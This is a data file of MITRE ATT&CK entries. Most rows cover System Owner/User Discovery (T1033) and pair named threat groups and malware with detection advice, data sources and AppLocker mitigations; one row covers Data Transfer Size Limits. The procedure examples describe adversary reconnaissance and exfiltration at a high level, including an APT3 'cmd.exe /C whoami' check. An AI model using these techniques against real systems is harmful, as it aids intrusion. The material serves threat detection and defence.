553,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0130|Unknown Logger]] can obtain information about the victim usernames.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: Unknown Logger,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
554,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['A Linux version of [[Software/S0021|Derusbi]] checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges.[[CiteRef::Fidelis Turbo]]']",['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: Derusbi,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
555,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0161|XAgentOSX]] contains the getInfoOSX function to return the OS X version as well as the current user.[[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: XAgentOSX,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
556,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['The OsInfo function collects the current running username [[CiteRef::Sofacy Komplex Trojan]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: Komplex,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
557,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0007|APT28]] has queried information on machines to determine the current user or system owner [[CiteRef::XAgentOSX]].'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
558,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0148|RTM]] can obtain the victim username and permissions.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: RTM,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
559,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0058|SslMM]] sends the logged-on username to its hard-coded C2.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: SslMM,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
560,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0060|Sys10]] collects the account name of the logged-in user and sends it to the C2.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: Sys10,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
561,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",[u'[[Software/S0059|WinMM]] uses NetUser-GetInfo to identify that it is running under an \u201cAdmin\u201d account on the local system.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: WinMM,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
562,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0038|Stealth Falcon]] malware gathers the registered user and primary owner name via WMI.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
563,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0051|FIN10]] has used Meterpreter to enumerate users on remote systems.[[CiteRef::FireEye FIN10 June 2017]]'],['FIN10'],['FIN10'],['G0051'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
564,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0155|WINDSHIELD]] can gather the victim user name.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: WINDSHIELD,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
565,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0093|Backdoor.Oldrea]] collects the current username from the victim.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Backdoor.Oldrea, Havex",['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
566,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0084|Mis-Type]] runs tests to determine the privilege level of the compromised user.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: Mis-Type,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
567,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[""[[Software/S0139|PowerDuke]] has commands to get the current user's name and SID.[[CiteRef::Volexity PowerDuke November 2016]]""]",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],Software: PowerDuke,['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
568,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[""[[Group/G0032|Lazarus Group]] malware SierraAlfa and WhiskeyAlfa-Three enumerate logged-on users. [[Group/G0032|Lazarus Group]] malware IndiaIndia collects the victim's username and sends it to the C2 server.[[CiteRef::Novetta Blockbuster Loaders]]\n[[CiteRef::Novetta Blockbuster RATs]][[CiteRef::Novetta Blockbuster Destructive Malware]]""]",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
569,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[u'An [[Group/G0022|APT3]] downloader uses the Windows command <code>""cmd.exe"" /C whoami</code> to verify that it is running with the elevated privileges of \u201cSystem.\u201d[[CiteRef::FireEye Operation Double Tap]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
570,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0153|RedLeaves]] can obtain information about the logged on user both locally and for Remote Desktop sessions.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: RedLeaves, BUGJUICE",['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
571,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['[[Group/G0040|Patchwork]] collected the victim username and whether it was running as admin, then sent the information to its C2 server.[[CiteRef::Cymmetria Patchwork]]']",['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1033'],['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
572,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['[[Software/S0150|POSHSPY]] uploads data in 2048-byte chunks.[[CiteRef::FireEye POSHSPY April 2017]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: POSHSPY,['Exfiltration'],['Technique/T1030'],['Data Transfer Size Limits'],https://attack.mitre.org/wiki/Technique/T1030
